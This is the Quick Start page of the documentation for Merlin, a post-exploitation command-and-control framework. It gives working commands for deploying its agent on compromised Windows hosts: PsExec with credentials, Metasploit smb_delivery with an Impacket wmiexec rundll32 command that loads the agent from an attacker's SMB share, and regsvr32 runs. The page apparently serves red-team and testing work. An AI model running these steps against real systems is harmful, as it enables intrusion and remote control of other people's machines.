<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.18.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Quick Start &mdash; Merlin BETA documentation</title>
      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script src="../_static/jquery.js?v=5d32c60e"></script>
        <script src="../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
        <script src="../_static/documentation_options.js?v=850acc4c"></script>
        <script src="../_static/doctools.js?v=888ff710"></script>
        <script src="../_static/sphinx_highlight.js?v=dc90522c"></script>
    <script src="../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../genindex.html" />
    <link rel="search" title="Search" href="../search.html" />
    <link rel="next" title="Command Line Flags" href="../agent/cli.html" />
    <link rel="prev" title="FAQ" href="../faq/faq.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >

          
          
          <a href="../index.html" class="icon icon-home">
            Merlin
          </a>
              <div class="version">
                0.8.0
              </div>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">FAQ</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../faq/faq.html">FAQ</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Quick Start</span></p>
<ul class="current">
<li class="toctree-l1 current"><a class="current reference internal" href="#">Quick Start</a><ul>
<li class="toctree-l2"><a class="reference internal" href="#merlin-server">Merlin Server</a></li>
<li class="toctree-l2"><a class="reference internal" href="#merlin-agent">Merlin Agent</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#upload-execute">Upload &amp; Execute</a></li>
<li class="toctree-l3"><a class="reference internal" href="#windows-local-command-execution">Windows Local Command Execution</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#windows-exe-cmd-exe">Windows EXE - cmd.exe</a></li>
<li class="toctree-l4"><a class="reference internal" href="#windows-dll-rundll32-exe">Windows DLL - rundll32.exe</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#windows-remote-command-execution">Windows Remote Command Execution</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#windows-exe-psexec-exe">Windows EXE - PsExec.exe</a></li>
<li class="toctree-l4"><a class="reference internal" href="#windows-dll-metasploit-s-smb-delivery">Windows DLL - Metasploit’s SMB Delivery</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#advanced">Advanced</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#recompile-dll">Recompile DLL</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Merlin Agent</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../agent/cli.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../agent/dll.html">DLL Agent</a></li>
<li class="toctree-l1"><a class="reference internal" href="../agent/custom.html">Custom Build</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Merlin CLI</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../cli/faq.html">FAQ</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/cli.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/tls.html">TLS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/listeners.html">Listeners</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/commands.html">Command Interface</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/logging.html">Logging</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/menu/main.html">Main Menu</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/menu/agents.html">Agent Menu</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/menu/listeners.html">Listener Menu</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cli/menu/modules.html">Modules Menu</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Merlin Server</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../server/server.html">Command Line Flags</a></li>
<li class="toctree-l1"><a class="reference internal" href="../server/logging.html">Logging</a></li>
<li class="toctree-l1"><a class="reference internal" href="../server/x509.html">TLS Certificates</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Modules</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../modules/build.html">Building Modules</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Misc.</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../misc/blogs.html">Blog Posts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../misc/contrib.html">Contributing</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">Merlin</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Quick Start</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../_sources/quickStart/quickstart.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="quick-start">
<h1>Quick Start<a class="headerlink" href="#quick-start" title="Link to this heading"></a></h1>
<section id="merlin-server">
<span id="server-quickstart"></span><h2>Merlin Server<a class="headerlink" href="#merlin-server" title="Link to this heading"></a></h2>
<p>The quickest and recommended way is to download Merlin Server from the <a class="reference external" href="https://github.com/Ne0nd0g/merlin/releases">releases</a>
page for your host operating system (i.e Windows, macOS, or Linux).</p>
<p>The following single line of code can be used to download, extract, and run Merlin Server on an Ubuntu Server:</p>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>bash<span class="p">;</span>apt<span class="w"> </span>update<span class="p">;</span>apt<span class="w"> </span>install<span class="w"> </span>p7zip-full<span class="w"> </span>-y<span class="p">;</span><span class="nb">cd</span><span class="w"> </span>/opt<span class="p">;</span>wget<span class="w"> </span>https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z<span class="p">;</span>7z<span class="w"> </span>x<span class="w"> </span>-pmerlin<span class="w"> </span>-omerlin<span class="w"> </span>merlinServer-Linux-x64.7z<span class="p">;</span><span class="nb">cd</span><span class="w"> </span>merlin<span class="p">;</span>./merlinServer-Linux-x64
</pre></div>
</div>
<p>If you’re using 7zip from the command line, but sure to use the <code class="docutils literal notranslate"><span class="pre">x</span></code> flag so that the files are extracted into their respective directories.</p>
<p><strong>The Merlin Server file download includes the CLI and compiled agents for all 3 major platforms in the</strong> <code class="docutils literal notranslate"><span class="pre">data/bin/</span></code> <strong>directory</strong></p>
</section>
<section id="merlin-agent">
<span id="agent-quickstart"></span><h2>Merlin Agent<a class="headerlink" href="#merlin-agent" title="Link to this heading"></a></h2>
<p>Merlin is a post-exploitation framework and therefore documentation doesn’t cover any of the steps required to get to a
point where you can execute code or commands on a compromised host. Exploiting or accessing a host must performed prior
to leveraging Merlin.</p>
<div class="line-block">
<div class="line"><strong>Pre-compiled Merlin Agent binary files are distributed with the server download in the</strong> <code class="docutils literal notranslate"><span class="pre">data/bin/</span></code> <strong>directory of Merlin</strong></div>
</div>
<p>The Merlin Agent source code can be found <a class="reference external" href="https://github.com/Ne0nd0g/merlin-agent">https://github.com/Ne0nd0g/merlin-agent</a></p>
<p>Retrieve with Go and build the Agent:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">go</span> <span class="n">get</span> <span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ne0nd0g</span><span class="o">/</span><span class="n">merlin</span><span class="o">-</span><span class="n">agent</span>
</pre></div>
</div>
<section id="upload-execute">
<h3>Upload &amp; Execute<a class="headerlink" href="#upload-execute" title="Link to this heading"></a></h3>
<p>One of the more simple ways to run Merlin is by uploading the compiled binary file to a compromised host and then execute that binary.</p>
<div class="line-block">
<div class="line">Don’t forget to specify the address of your Merlin server with the <code class="docutils literal notranslate"><span class="pre">-url</span></code> flag. Default is <cite>https://127.0.0.1:443/</cite></div>
</div>
</section>
<section id="windows-local-command-execution">
<h3>Windows Local Command Execution<a class="headerlink" href="#windows-local-command-execution" title="Link to this heading"></a></h3>
<p>This section covers executing the Merlin agent with local command execution.</p>
<section id="windows-exe-cmd-exe">
<h4>Windows EXE - cmd.exe<a class="headerlink" href="#windows-exe-cmd-exe" title="Link to this heading"></a></h4>
<p>With the <cite>merlinAgent.exe</cite> binary file already downloaded on to the compromised host, execute it by calling it from the
command line. Double clicking the executable file will cause the agent to run <strong>without</strong> a window, so you will not see
anything, and it will connect to the <strong>default</strong> URL of <cite>https://127.0.0.1:443/</cite>.
This can be changed by recompiling the agent with the hardcoded address of your Merlin server.</p>
<p>cmd.exe example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Bob</span>\<span class="n">Downloads</span><span class="o">&gt;</span><span class="n">merlinAgent</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.1.100</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span>
</pre></div>
</div>
</section>
<section id="windows-dll-rundll32-exe">
<h4>Windows DLL - rundll32.exe<a class="headerlink" href="#windows-dll-rundll32-exe" title="Link to this heading"></a></h4>
<p>With the <cite>merlin.dll</cite> binary file already downloaded on to the compromised host, execute it by calling it from the
command line using the <cite>rundll32.exe</cite> program that comes with Windows.
<cite>Run</cite> is the name of the DLL entrypoint called when the DLL is executed.
Provide the URL for your listening Merlin server after the entrypoint.</p>
<p>rundll32.exe example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">C</span><span class="p">:</span>\<span class="n">Users</span>\<span class="n">Bob</span>\<span class="n">Downloads</span><span class="o">&gt;</span><span class="n">C</span><span class="p">:</span>\<span class="n">WINDOWS</span>\<span class="n">System32</span>\<span class="n">rundll32</span><span class="o">.</span><span class="n">exe</span> <span class="n">merlin</span><span class="o">.</span><span class="n">dll</span><span class="p">,</span><span class="n">Run</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.1.100</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span>
</pre></div>
</div>
</section>
</section>
<section id="windows-remote-command-execution">
<h3>Windows Remote Command Execution<a class="headerlink" href="#windows-remote-command-execution" title="Link to this heading"></a></h3>
<p>This section covers executing Merlin agent when remotely accessing a host.</p>
<section id="windows-exe-psexec-exe">
<h4>Windows EXE - PsExec.exe<a class="headerlink" href="#windows-exe-psexec-exe" title="Link to this heading"></a></h4>
<p>The Microsoft Sysinternals <a class="reference external" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec.exe</a> application
can be used to connect to a remote host, upload the Merlin agent file, and execute it.
The downside to this is the Merlin agent binary file is “on disk” and provides an opportunity for Anti-Virus software
to detect the application. Use PsExec’s <cite>-c</cite> flag to specify the location of the Merlin agent file on the attacker’s
host that will be uploaded to the remote host. The PsExec <cite>-d</cite> flag is required so that control is returned to the user
after executing the Merlin agent file.</p>
<p>PsExec.exe example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">PS</span> <span class="n">C</span><span class="p">:</span>\<span class="n">SysinternalsSuite</span><span class="o">&gt;.</span>\<span class="n">PsExec</span><span class="o">.</span><span class="n">exe</span> \\<span class="mf">192.168.1.10</span> <span class="o">-</span><span class="n">u</span> <span class="n">bob</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">c</span> <span class="n">C</span><span class="p">:</span>\<span class="n">merlin</span>\<span class="n">data</span>\<span class="nb">bin</span>\<span class="n">windows</span>\<span class="n">merlinAgent</span><span class="o">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">url</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168.1.100</span><span class="p">:</span><span class="mi">443</span><span class="o">/</span>
</pre></div>
</div>
</section>
<section id="windows-dll-metasploit-s-smb-delivery">
<h4>Windows DLL - Metasploit’s SMB Delivery<a class="headerlink" href="#windows-dll-metasploit-s-smb-delivery" title="Link to this heading"></a></h4>
<p>One method for delivery is to use an SMB server to host the payload and execute a command on the remote host to download
and run the Merlin agent file. The Metasploit <cite>windows/smb/smb_delivery</cite> module is a good way to quickly stand up an SMB
server for delivering the payload.</p>
<p>Setup the <code class="docutils literal notranslate"><span class="pre">windows/smb/smb_delivery</span></code> module:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>msf &gt; use windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) &gt; set FILE_NAME merlin.dll
FILE_NAME =&gt; merlin.dll
msf exploit(windows/smb/smb_delivery) &gt; set EXE::Custom /opt/merlin.dll
EXE::Custom =&gt; /opt/merlin/data/bin/dll/merlin.dll
msf exploit(windows/smb/smb_delivery) &gt; set DisablePayloadHandler true
DisablePayloadHandler =&gt; true
msf exploit(windows/smb/smb_delivery) &gt; set VERBOSE true
VERBOSE =&gt; true
msf exploit(windows/smb/smb_delivery) &gt; run
[*] Exploit running as background job 0.
msf exploit(windows/smb/smb_delivery) &gt;
[*] Server started.
[*] Run the following command on the target machine:
[*] Using custom payload /opt/merlin.dll, RHOST and RPORT settings will be ignored!
rundll32.exe \\192.168.1.100\WxlV\merlin.dll,0
</pre></div>
</div>
<div class="line-block">
<div class="line"><strong>NOTE:</strong> We must change the DLL entry point from <cite>0</cite> to <cite>Run</cite> and provide the URL of the listening Merlin server</div>
</div>
<p>Now that the SMB server is setup to deliver the <cite>merlin.dll</cite> file, we need to remotely access the target host and
execute the command. By default, Metasploit sets the entry point to <cite>0</cite>. We need to modify the command to change the
entry point to <cite>Run</cite> and specify the location of our listening Merlin server.
<a class="reference external" href="https://github.com/CoreSecurity/impacket">Impacket’s</a> <cite>wmiexec.py</cite> Python program is one way to remotely access a host.</p>
<p>wmiexec.py example:</p>
<div class="line-block">
<div class="line"><strong>NOTE:</strong> We must change the DLL entry point from <cite>0</cite> to <cite>Run</cite> and provide the URL of the listening Merlin server</div>
</div>
<div class="highlight-text notranslate"><div class="highlight"><pre><span></span>root@kali:/opt/impacket/examples# python wmiexec.py bob:password@192.168.1.10
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;rundll32.exe \\192.168.1.100\WxlV\merlin.dll,Run https://192.168.1.100:443/
</pre></div>
</div>
</section>
</section>
<section id="advanced">
<h3>Advanced<a class="headerlink" href="#advanced" title="Link to this heading"></a></h3>
<p>The quick start examples above executed the Merlin agent and allowed the user to dynamically specify the location of the
listening Merlin server with a command line parameter. There are a few instances where we the user is unable to specify,
or simply don’t want to, the URL for the listening Merlin server. In this case, the Merlin agent binary should be
recompiled with a hardcoded URL of the listening Merlin server so that it does not need to be specified by the user
during execution.
<em>Do not continue on unless you are OK to deal with things that sometimes work and often have bugs and are not reliable.</em></p>
<div class="line-block">
<div class="line">This will require that you have Go and gcc installed on the host compiling the application</div>
</div>
<section id="recompile-dll">
<h4>Recompile DLL<a class="headerlink" href="#recompile-dll" title="Link to this heading"></a></h4>
<p>The <cite>merlin.dll</cite> file can be configured with the hardcoded url of your Merlin server.
To do this, clone the repo, modify the file, and recompile it.</p>
<ol class="arabic simple">
<li><p>Clone the merlin repository using git</p></li>
<li><p>Edit the <cite>main.go</cite> file</p></li>
<li><p>Find the string <cite>var url = “https://127.0.0.1:443/”</cite> and change the address</p></li>
<li><p>Compile the DLL</p></li>
</ol>
<p>example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">cd</span> <span class="o">/</span><span class="n">opt</span>
<span class="n">git</span> <span class="n">clone</span> <span class="o">-</span><span class="n">b</span> <span class="n">dev</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Ne0nd0g</span><span class="o">/</span><span class="n">merlin</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">dll</span><span class="o">.</span><span class="n">git</span>
<span class="n">cd</span> <span class="n">merlin</span><span class="o">-</span><span class="n">agent</span><span class="o">-</span><span class="n">dll</span>
<span class="n">sed</span> <span class="o">-</span><span class="n">i</span> <span class="s1">&#39;s_https://127.0.0.1:443/_https://192.168.1.100:443/_&#39;</span> <span class="n">main</span><span class="o">.</span><span class="n">go</span>
<span class="n">make</span>
</pre></div>
</div>
<p>This will leave the <cite>merlin.dll</cite> in the <cite>bin/v0.5.0/</cite> directory where <cite>v0.5.0</cite> is the current version number of Merlin.
Now the recompiled version of the DLL can be run without having to specify the address of the Merlin server.</p>
<p>rundll32.exe examples:</p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,main</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">rundll32.exe</span> <span class="pre">merlin,Run</span></code></p></li>
</ul>
<p>regsvr32.exe examples:</p>
<ul class="simple">
<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">merlin.dll</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/u</span> <span class="pre">merlin.dll</span></code></p></li>
<li><p><code class="docutils literal notranslate"><span class="pre">regsvr32.exe</span> <span class="pre">/s</span> <span class="pre">/n</span> <span class="pre">/i</span> <span class="pre">merlin.dll</span></code></p></li>
</ul>
</section>
</section>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="../faq/faq.html" class="btn btn-neutral float-left" title="FAQ" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="../agent/cli.html" class="btn btn-neutral float-right" title="Command Line Flags" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2023, Russel Van Tuyl (@Ne0nd0g).</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>